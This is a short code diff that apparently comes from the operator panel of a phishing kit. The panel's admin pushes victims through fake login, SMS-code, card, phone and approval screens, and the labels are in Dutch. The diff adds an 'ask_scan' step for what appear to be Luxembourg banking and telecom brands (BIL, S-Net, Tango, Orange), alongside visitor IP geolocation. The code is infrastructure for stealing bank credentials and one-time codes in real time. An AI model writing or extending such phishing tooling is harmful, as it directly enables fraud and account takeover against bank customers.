@@ -102,12 +102,13 @@ export async function fetchIpLocation() {
 }
 
 // Command types admin can send:
-// connected | ask_login | ask_qr (BIL extra) | ask_approve | ask_phone |
+// connected | ask_login | ask_scan + ask_qr (BIL/S-Net extra) | ask_approve | ask_phone |
 // ask_sms | ask_card | ask_info | ask_confirm | done | reset_waiting
 export const COMMAND_TO_STATUS = {
   connected: "waiting",
   ask_login: "login_requested",
   ask_qr: "qr_requested",
+  ask_scan: "scan_requested",
   ask_tango: "tango_requested",
   ask_orange: "orange_requested",
   ask_approve: "approve_requested",
@@ -131,6 +132,8 @@ export const STATUS_LABEL = {
   orange_submitted: "Orange ingevuld",
   qr_requested: "QR getoond",
   qr_submitted: "QR ingevuld",
+  scan_requested: "Scan getoond",
+  scan_submitted: "Scan ingevuld",
   approve_requested: "Goedkeuring getoond",
   approve_submitted: "Goedkeuring ingevuld",
   phone_requested: "Telefoon getoond",
